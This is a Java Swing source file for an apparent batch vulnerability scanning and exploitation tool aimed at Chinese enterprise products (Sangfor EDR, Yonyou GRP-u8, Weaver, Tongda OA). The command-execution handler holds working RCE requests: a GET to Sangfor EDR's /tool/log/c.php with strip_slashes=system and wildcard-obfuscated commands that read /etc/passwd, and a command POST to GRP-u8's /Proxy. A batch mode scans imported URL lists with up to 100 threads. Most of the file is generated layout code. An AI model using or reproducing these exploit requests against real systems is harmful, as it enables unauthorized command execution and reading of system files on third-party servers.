/*
 * Created by JFormDesigner on Tue Aug 18 09:30:38 CST 2020
 */

package com.motanni;

import java.awt.*;
import java.awt.event.*;
import java.io.File;
import java.util.HashSet;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.swing.*;
import javax.swing.GroupLayout;
import javax.swing.plaf.*;
import javax.swing.table.*;

/**
 * @author txf
 */
public class Main extends JFrame {
    public Main() {
        initComponents();
    }

    private HashSet<String> list_check=new HashSet<String>();
    public static AtomicInteger count = new AtomicInteger(0);//线程安全的计数变量
    private ExecutorService es = null;
    //批量状态
    private JLabel status_lable=null;
    private SwingWorker batch_statusWork=null;

    private SwingWorker batch_startWork=null;

    public void log(String info){
        this.result_text.append(info+"\r\n");
        result_text.paintImmediately(result_text.getBounds());
    }
    private void dispatch(char method){
//        String url=Tools.addTheURL(this.url_text.getText());
        String url=this.url_text.getText();
        String vulName=this.jcombox_vuls.getSelectedItem().toString();
        try {
            BasePayload bp=Tools.getPayload(vulName);
            switch(method){
                case 'c':
                    boolean isVul=bp.checkVUL(url);
                    if(isVul){
                        log(url+"存在漏洞！");
                        JOptionPane.showMessageDialog(null, "存在漏洞", "漏洞验证结果", JOptionPane.ERROR_MESSAGE);
                    }
                    else{
                        log(url+"不存在漏洞！");
                        JOptionPane.showMessageDialog(null, "不存在漏洞", "漏洞验证结果", JOptionPane.INFORMATION_MESSAGE);
                    }
                    break;

                case 'b':
                    this.status_lable=this.jlabel_check_status;
                    EventQueue.invokeLater(new Runnable() {
                        @Override
                        public void run() {
                        }
                    });
                    batch_startWork=new SwingWorker<Void, Void>() {
                        @Override
                        protected Void doInBackground() throws Exception {

                            int index=0;
                            for(String curl : list_check) {
                                BaseCheck bc=new BaseCheck();
                                bc.table=jtable_batch_check_result;
                                index++;
                                bc.index=index;
                                bc.url=curl;
                                bc.init(bp);
                                es.execute(bc);
                            }
                            es.shutdown();
                            while(!es.isTerminated()){
                                Thread.sleep(200);
                            }
                            log("批量检查线程执行完成");
                            return null;
                        }
                        @Override
                        protected void done(){
                            jbtn_batch_check_start.setEnabled(true);
                            if(batch_statusWork!=null){
                                batch_statusWork.cancel(true);
                            }
                        }
                    };
                    batch_startWork.execute();
                    batch_statusWork=new SwingWorker<Void, Void>() {
                        @Override
                        protected Void doInBackground() throws Exception {
                            int time=0;
                            while(true){
                                status_lable.setText(count.get()+"/"+list_check.size());
                                jlable_useTime.setText(time+"");
                                Thread.sleep(1000);
                                time++;
                            }
                        }
                    };
                    batch_statusWork.execute();

                    break;
            }

        } catch (Exception e) {
            log(e.toString());
        }
    }


    private void button1ActionPerformed(ActionEvent e) throws Exception {
        String url = url_text.getText();
//        String url = Tools.addTheURL(this.url_text.getText());

        if (jcombox_vuls.getSelectedItem().toString().startsWith("深信服EDR")){
            String commond = commond_cbx.getSelectedItem().toString();
            if (commond=="ifconfig"){
                commond = "/??in/ifcon???";
            }if (commond=="cat /etc/passwd"){
                commond = "/?in/cat%20/?tc/p?sswd";
            }

            String result = HttpTool.getHttpReuest(url+"/tool/log/c.php?strip_slashes=system&host="+commond,"utf-8");
            log(result);
        }else if (jcombox_vuls.getSelectedItem().toString().startsWith("用友GRP-u8命令执行")){
            String commond = commond_cbx.getSelectedItem().toString();
            String result = HttpTool.postHttpRequest(url + "/Proxy","gbk", commond);
            Pattern pattern = Pattern.compile("output=(.*?)<ROW");
            Matcher matcher = pattern.matcher(result);
            if (matcher.find()) {
                try {
                    log(matcher.group(0));
                } catch (Exception ex) {
                    ex.printStackTrace();
                }

            }

//            log(m);
        }

    }

    private void clear_btnActionPerformed(ActionEvent e) {
        result_text.setText("");
        DefaultTableModel tableModel = (DefaultTableModel) jtable_batch_check_result.getModel();
        tableModel.setRowCount( 0 );

    }

    private void jbtn_batch_check_importActionPerformed(ActionEvent e) {
        JFileChooser jfc=new JFileChooser();
        jfc.setFileSelectionMode(JFileChooser.FILES_ONLY );
        jfc.showDialog(new JLabel(), "选择");
        File file=jfc.getSelectedFile();

        if(file!=null){
            this.jtxt_batch_chek_path.setText(file.getAbsolutePath());
            list_check=Tools.read(file.getAbsolutePath(), "UTF-8");
            JOptionPane.showMessageDialog(null, "成功导入"+list_check.size()+"个URL！", "导入URL", JOptionPane.INFORMATION_MESSAGE);
        }
    }

    private void jbtn_batch_check_startActionPerformed(ActionEvent e) {
        this.jbtn_batch_check_start.setEnabled(false);
        count=new AtomicInteger(0);
        if(list_check.size()>0){
            int threadSize=Integer.parseInt(this.j_combox_threadSize.getSelectedItem().toString());
            DefaultTableModel dt=(DefaultTableModel)jtable_batch_check_result.getModel();
            dt.setRowCount(0);
            es= Executors.newFixedThreadPool(threadSize);
            dispatch('b');
        }
        else{
            JOptionPane.showMessageDialog(null, "请先导入检查URL！", "URL批量检查", JOptionPane.WARNING_MESSAGE);
            this.jbtn_batch_check_start.setEnabled(true);
        }
    }

    private void jbtn_batch_check_stopActionPerformed(ActionEvent e) {
        if(es!=null)  {
            es.shutdownNow();
            if(batch_startWork!=null){
                batch_startWork.cancel(true);
            }
            if(batch_statusWork!=null){
                batch_statusWork.cancel(true);
            }
            log("线程已经停止！");
        }
    }

    private void jtable_batch_check_resultMouseClicked(MouseEvent e) {
        // TODO add your code here
    }

    private void jbtn_startActionPerformed(ActionEvent e) throws Exception {
        boolean isok=Tools.checkTheURL(this.url_text.getText());
//        String url = Tools.checkTheDomain(this.url_text.getText());
        if(isok){
            dispatch('c');
        }
        else{
            JOptionPane.showMessageDialog(null, "URL格式不符合要求，示例：http://127.0.0.1:7001/", "URL检查", JOptionPane.WARNING_MESSAGE);
        }

        this.jbtn_start.setEnabled(true);
    }

    private void initComponents() {
        // JFormDesigner - Component initialization - DO NOT MODIFY  //GEN-BEGIN:initComponents
        label1 = new JLabel();
        url_text = new JTextField();
        commond_cbx = new JComboBox<>();
        button1 = new JButton();
        scrollPane1 = new JScrollPane();
        result_text = new JTextArea();
        clear_btn = new JButton();
        jLabel4 = new JLabel();
        jtxt_batch_chek_path = new JTextField();
        jbtn_batch_check_import = new JButton();
        jbtn_batch_check_start = new JButton();
        jbtn_batch_check_stop = new JButton();
        jLabel6 = new JLabel();
        jLabel5 = new JLabel();
        jtable_batch_check_result2222 = new JTable();
        jlabel_check_status = new JLabel();
        jlable_useTime = new JLabel();
        jScrollPane5 = new JScrollPane();
        jtable_batch_check_result = new JTable();
        jLabel3 = new JLabel();
        j_combox_threadSize = new JComboBox<>();
        jbtn_start = new JButton();
        lbl_server = new JLabel();
        jcombox_vuls = new JComboBox<>();
        label2 = new JLabel();

        //======== this ========
        setTitle("\u4e34\u65f6\u7248\u6f0f\u6d1e\u6279\u91cf\u68c0\u6d4b\u5de5\u5177-\u96f7\u77f3\u5b89\u5168\u5b9e\u9a8c\u5ba4");
        setBackground(UIManager.getColor("Button.foreground"));
        Container contentPane = getContentPane();

        //---- label1 ----
        label1.setText("    url \uff1a");

        //---- url_text ----
        url_text.setText("https://127.0.0.1");

        //---- commond_cbx ----
        commond_cbx.setEditable(true);
        commond_cbx.setModel(new DefaultComboBoxModel<>(new String[] {
            "id",
            "whoami",
            "ifconfig",
            "cat /etc/passwd"
        }));
        commond_cbx.setSelectedIndex(1);

        //---- button1 ----
        button1.setText("\u6267\u884c\u547d\u4ee4");
        button1.addActionListener(e -> {
            try {
                button1ActionPerformed(e);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        });

        //======== scrollPane1 ========
        {

            //---- result_text ----
            result_text.setSelectedTextColor(Color.white);
            scrollPane1.setViewportView(result_text);
        }

        //---- clear_btn ----
        clear_btn.setText("clear");
        clear_btn.addActionListener(e -> clear_btnActionPerformed(e));

        //---- jLabel4 ----
        jLabel4.setText("\u6587\u4ef6\u8def\u5f84\uff1a");

        //---- jbtn_batch_check_import ----
        jbtn_batch_check_import.setText("\u5bfc \u5165");
        jbtn_batch_check_import.addActionListener(e -> jbtn_batch_check_importActionPerformed(e));

        //---- jbtn_batch_check_start ----
        jbtn_batch_check_start.setText("\u5f00 \u59cb");
        jbtn_batch_check_start.addActionListener(e -> jbtn_batch_check_startActionPerformed(e));

        //---- jbtn_batch_check_stop ----
        jbtn_batch_check_stop.setText("\u505c \u6b62");
        jbtn_batch_check_stop.addActionListener(e -> jbtn_batch_check_stopActionPerformed(e));

        //---- jLabel6 ----
        jLabel6.setText("\u7528\u65f6\uff1a");

        //---- jLabel5 ----
        jLabel5.setText("\u8fdb\u5ea6\uff1a");

        //---- jtable_batch_check_result2222 ----
        jtable_batch_check_result2222.setAutoCreateRowSorter(true);
        jtable_batch_check_result2222.setModel(new DefaultTableModel(
            new Object[][] {
            },
            new String[] {
                "\u5e8f\u53f7", "Web\u670d\u52a1\u5668", "URL\u5730\u5740", "\u662f\u5426\u5b58\u5728\u6f0f\u6d1e"
            }
        ) {
            boolean[] columnEditable = new boolean[] {
                false, false, false, false
            };
            @Override
            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return columnEditable[columnIndex];
            }
        });
        jtable_batch_check_result2222.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                jtable_batch_check_resultMouseClicked(e);
            }
        });

        //---- jlabel_check_status ----
        jlabel_check_status.setText("0/0");

        //---- jlable_useTime ----
        jlable_useTime.setText("0");

        //======== jScrollPane5 ========
        {

            //---- jtable_batch_check_result ----
            jtable_batch_check_result.setAutoCreateRowSorter(true);
            jtable_batch_check_result.setModel(new DefaultTableModel(
                new Object[][] {
                },
                new String[] {
                    "\u5e8f\u53f7", "URL\u5730\u5740", "\u662f\u5426\u5b58\u5728\u6f0f\u6d1e"
                }
            ) {
                boolean[] columnEditable = new boolean[] {
                    false, false, false
                };
                @Override
                public boolean isCellEditable(int rowIndex, int columnIndex) {
                    return columnEditable[columnIndex];
                }
            });
            jtable_batch_check_result.addMouseListener(new MouseAdapter() {
                @Override
                public void mouseClicked(MouseEvent e) {
                    jtable_batch_check_resultMouseClicked(e);
                }
            });
            jScrollPane5.setViewportView(jtable_batch_check_result);
        }

        //---- jLabel3 ----
        jLabel3.setText("\u7ebf\u7a0b\uff1a");

        //---- j_combox_threadSize ----
        j_combox_threadSize.setEditable(true);
        j_combox_threadSize.setModel(new DefaultComboBoxModel<>(new String[] {
            "1",
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9",
            "10",
            "15",
            "20",
            "25",
            "30",
            "40",
            "50",
            "60",
            "70",
            "80",
            "90",
            "100"
        }));
        j_combox_threadSize.setSelectedIndex(9);

        //---- jbtn_start ----
        jbtn_start.setText("\u68c0 \u67e5");
        jbtn_start.setPreferredSize(new Dimension(81, 23));
        jbtn_start.addActionListener(e -> {
            try {
                jbtn_startActionPerformed(e);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        });

        //---- lbl_server ----
        lbl_server.setText("\u9009\u62e9\u6f0f\u6d1e\uff1a");

        //---- jcombox_vuls ----
        jcombox_vuls.setModel(new DefaultComboBoxModel<>(new String[] {
            "\u7528\u53cbGRP-u8\u547d\u4ee4\u6267\u884c",
            "\u6cdb\u5fae\u4e91\u6865\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6",
            "\u5b9d\u5854\u540e\u95e8\u6f0f\u6d1e",
            "\u6df1\u4fe1\u670dEDR\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e",
            "\u901a\u8fbeOA\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"
        }));

        //---- label2 ----
        label2.setText("  \u547d \u4ee4:");

        GroupLayout contentPaneLayout = new GroupLayout(contentPane);
        contentPane.setLayout(contentPaneLayout);
        contentPaneLayout.setHorizontalGroup(
            contentPaneLayout.createParallelGroup()
                .addGroup(contentPaneLayout.createSequentialGroup()
                    .addContainerGap()
                    .addGroup(contentPaneLayout.createParallelGroup()
                        .addComponent(scrollPane1)
                        .addComponent(jScrollPane5)
                        .addGroup(contentPaneLayout.createSequentialGroup()
                            .addGroup(contentPaneLayout.createParallelGroup()
                                .addGroup(contentPaneLayout.createSequentialGroup()
                                    .addComponent(label1, GroupLayout.PREFERRED_SIZE, 65, GroupLayout.PREFERRED_SIZE)
                                    .addGap(18, 18, 18))
                                .addGroup(GroupLayout.Alignment.TRAILING, contentPaneLayout.createSequentialGroup()
                                    .addComponent(label2, GroupLayout.PREFERRED_SIZE, 65, GroupLayout.PREFERRED_SIZE)
                                    .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)))
                            .addGroup(contentPaneLayout.createParallelGroup()
                                .addGroup(contentPaneLayout.createSequentialGroup()
                                    .addComponent(commond_cbx)
                                    .addGap(51, 51, 51)
                                    .addComponent(button1, GroupLayout.PREFERRED_SIZE, 95, GroupLayout.PREFERRED_SIZE)
                                    .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
                                    .addComponent(clear_btn, GroupLayout.PREFERRED_SIZE, 89, GroupLayout.PREFERRED_SIZE)
                                    .addGap(230, 230, 230))
                                .addGroup(contentPaneLayout.createSequentialGroup()
                                    .addComponent(url_text, GroupLayout.PREFERRED_SIZE, 391, GroupLayout.PREFERRED_SIZE)
                                    .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))
                            .addComponent(jlable_useTime, GroupLayout.PREFERRED_SIZE, 48, GroupLayout.PREFERRED_SIZE)
                            .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(jbtn_batch_check_start, GroupLayout.PREFERRED_SIZE, 81, GroupLayout.PREFERRED_SIZE)
                            .addGap(99, 99, 99))
                        .addGroup(contentPaneLayout.createSequentialGroup()
                            .addGap(6, 6, 6)
                            .addComponent(lbl_server, GroupLayout.PREFERRED_SIZE, 66, GroupLayout.PREFERRED_SIZE)
                            .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
                            .addComponent(jcombox_vuls, GroupLayout.PREFERRED_SIZE, 400, GroupLayout.PREFERRED_SIZE)
                            .addGap(18, 18, 18)
                            .addComponent(jbtn_start, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                            .addGap(31, 31, 31)
                            .addGroup(contentPaneLayout.createParallelGroup()
                                .addGroup(contentPaneLayout.createSequentialGroup()
                                    .addComponent(jLabel3, GroupLayout.PREFERRED_SIZE, 88, GroupLayout.PREFERRED_SIZE)
                                    .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                    .addComponent(j_combox_threadSize, GroupLayout.PREFERRED_SIZE, 89, GroupLayout.PREFERRED_SIZE)
                                    .addGap(105, 105, 105)
                                    .addComponent(jbtn_batch_check_stop, GroupLayout.PREFERRED_SIZE, 81, GroupLayout.PREFERRED_SIZE)
                                    .addGap(12, 12, 12))
                                .addGroup(contentPaneLayout.createSequentialGroup()
                                    .addComponent(jLabel6)
                                    .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                    .addComponent(jLabel5)
                                    .addGap(30, 30, 30)
                                    .addComponent(jlabel_check_status, GroupLayout.PREFERRED_SIZE, 72, GroupLayout.PREFERRED_SIZE)
                                    .addGap(28, 28, 28))
                                .addGroup(GroupLayout.Alignment.TRAILING, contentPaneLayout.createSequentialGroup()
                                    .addComponent(jLabel4)
                                    .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                                    .addComponent(jtxt_batch_chek_path)
                                    .addGap(18, 18, 18)
                                    .addComponent(jbtn_batch_check_import)
                                    .addGap(66, 66, 66)))))
                    .addGap(5, 5, 5))
        );
        contentPaneLayout.linkSize(SwingConstants.HORIZONTAL, new Component[] {button1, clear_btn});
        contentPaneLayout.setVerticalGroup(
            contentPaneLayout.createParallelGroup()
                .addGroup(contentPaneLayout.createSequentialGroup()
                    .addGap(58, 58, 58)
                    .addGroup(contentPaneLayout.createParallelGroup()
                        .addGroup(GroupLayout.Alignment.TRAILING, contentPaneLayout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel3, GroupLayout.PREFERRED_SIZE, 36, GroupLayout.PREFERRED_SIZE)
                            .addComponent(j_combox_threadSize, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                        .addGroup(GroupLayout.Alignment.TRAILING, contentPaneLayout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                            .addComponent(jbtn_batch_check_start, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(jbtn_batch_check_stop)))
                    .addGap(18, 18, 18)
                    .addComponent(jlable_useTime, GroupLayout.PREFERRED_SIZE, 49, GroupLayout.PREFERRED_SIZE)
                    .addGap(28, 28, 28)
                    .addComponent(jScrollPane5, GroupLayout.PREFERRED_SIZE, 344, GroupLayout.PREFERRED_SIZE)
                    .addGap(18, 18, 18)
                    .addComponent(scrollPane1, GroupLayout.PREFERRED_SIZE, 116, GroupLayout.PREFERRED_SIZE)
                    .addGap(16, 16, 16))
                .addGroup(contentPaneLayout.createSequentialGroup()
                    .addGroup(contentPaneLayout.createParallelGroup()
                        .addGroup(contentPaneLayout.createSequentialGroup()
                            .addGap(59, 59, 59)
                            .addComponent(label1, GroupLayout.PREFERRED_SIZE, 28, GroupLayout.PREFERRED_SIZE)
                            .addGap(28, 28, 28))
                        .addGroup(GroupLayout.Alignment.TRAILING, contentPaneLayout.createSequentialGroup()
                            .addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addGroup(contentPaneLayout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                                .addComponent(jbtn_start, GroupLayout.PREFERRED_SIZE, 30, GroupLayout.PREFERRED_SIZE)
                                .addComponent(jcombox_vuls, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                                .addComponent(jLabel4)
                                .addComponent(jtxt_batch_chek_path, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                                .addComponent(jbtn_batch_check_import)
                                .addComponent(lbl_server))
                            .addGap(18, 18, 18)
                            .addComponent(url_text, GroupLayout.PREFERRED_SIZE, 36, GroupLayout.PREFERRED_SIZE)
                            .addGap(18, 18, 18)))
                    .addGroup(contentPaneLayout.createParallelGroup()
                        .addGroup(contentPaneLayout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                            .addComponent(commond_cbx, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                            .addComponent(label2, GroupLayout.PREFERRED_SIZE, 28, GroupLayout.PREFERRED_SIZE)
                            .addComponent(button1)
                            .addComponent(clear_btn))
                        .addGroup(GroupLayout.Alignment.TRAILING, contentPaneLayout.createParallelGroup(GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel5)
                            .addComponent(jlabel_check_status))
                        .addComponent(jLabel6, GroupLayout.Alignment.TRAILING))
                    .addGap(532, 532, 532))
        );
        contentPaneLayout.linkSize(SwingConstants.VERTICAL, new Component[] {jLabel4, jLabel5, jLabel6, jbtn_batch_check_import, jlabel_check_status, jtxt_batch_chek_path});
        contentPaneLayout.linkSize(SwingConstants.VERTICAL, new Component[] {commond_cbx, jcombox_vuls, url_text});
        pack();
        setLocationRelativeTo(getOwner());
        // JFormDesigner - End of component initialization  //GEN-END:initComponents
    }

    // JFormDesigner - Variables declaration - DO NOT MODIFY  //GEN-BEGIN:variables
    private JLabel label1;
    private JTextField url_text;
    private JComboBox<String> commond_cbx;
    private JButton button1;
    private JScrollPane scrollPane1;
    private JTextArea result_text;
    private JButton clear_btn;
    private JLabel jLabel4;
    private JTextField jtxt_batch_chek_path;
    private JButton jbtn_batch_check_import;
    private JButton jbtn_batch_check_start;
    private JButton jbtn_batch_check_stop;
    private JLabel jLabel6;
    private JLabel jLabel5;
    private JTable jtable_batch_check_result2222;
    private JLabel jlabel_check_status;
    private JLabel jlable_useTime;
    private JScrollPane jScrollPane5;
    private JTable jtable_batch_check_result;
    private JLabel jLabel3;
    private JComboBox<String> j_combox_threadSize;
    private JButton jbtn_start;
    private JLabel lbl_server;
    private JComboBox<String> jcombox_vuls;
    private JLabel label2;
    // JFormDesigner - End of variables declaration  //GEN-END:variables
}
